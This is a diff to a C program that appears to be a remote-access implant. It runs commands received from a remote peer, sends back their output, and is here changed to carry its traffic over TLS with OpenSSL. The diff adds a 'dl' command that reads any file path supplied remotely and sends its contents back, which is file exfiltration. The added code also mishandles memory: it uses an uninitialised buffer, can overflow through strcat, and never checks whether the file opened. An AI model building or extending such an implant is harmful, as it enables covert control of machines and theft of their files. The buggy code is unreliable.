@@ -1,6 +1,12 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <openssl/crypto.h>
+#include <openssl/x509.h>
+#include <openssl/pem.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+
 #define BUFSIZE 256
 
 struct output {
@@ -105,7 +111,7 @@ struct output* call(char *cmd, int * size){
 }
 
 
-void handleResponse(char * response, int socket){
+void handleResponse(char * response, SSL* socket){
         char * ptr = response;
         int size;
         size = 0;
@@ -115,6 +121,9 @@ void handleResponse(char * response, int socket){
         int i, j;
         i = 0;
         j = 0;
+	FILE * fp;
+	int total = 0;
+	char line[250];
         if(response[0]=='!'){
                 start = call(ptr+1, &size);
                 if (start == NULL)
@@ -126,6 +135,21 @@ void handleResponse(char * response, int socket){
                 }
         }
         else {
+		if(strncmp(response, "dl", 2)==0){
+			char fileContent[4096];
+				printf("%s", ptr+3);
+				fp = fopen( strtok(ptr+3, "\n"), "r");
+				while(fgets(line, 250, fp)!=NULL){
+					total = total + strlen(line);
+					if(total >= 4096){
+						SSL_write(socket, fileContent, sizeof(fileContent));
+						memset(fileContent, 0, strlen(fileContent));
+						total = 0;
+					}
+					strcat(fileContent, line);
+				}
+						SSL_write(socket, fileContent, sizeof(fileContent));
+		}
                 //Copying string 2 to the end of string 1
                 for(i=orig_len;response[j]!='\0';i++)
                   {
@@ -134,15 +158,15 @@ void handleResponse(char * response, int socket){
                   }
                 message[i]='\0';
                 j = 0;
-                send(socket, message, strlen(message), 0); 
+                SSL_write(socket, message, strlen(message)); 
                 message[orig_len] ='\0';
         }
         if(!(strncmp("exit", response, 4))){
                 printf("exiting");
         }
-
+	
 }
-void sendOutput(struct output *start, int socket, int * size) {
+void sendOutput(struct output *start, SSL* socket, int * size) {
     struct output * ptr = start;
     char message[*size];
     memset(message, 0, sizeof(message));
@@ -152,6 +176,6 @@ void sendOutput(struct output *start, int socket, int * size) {
         printf(" pointer: %p : ", ptr->next);
         ptr = ptr->next;
     }   
-    send(socket, message, sizeof(message), 0); 
+    SSL_write(socket, message, sizeof(message)); 
     printf("returning to function");
 }
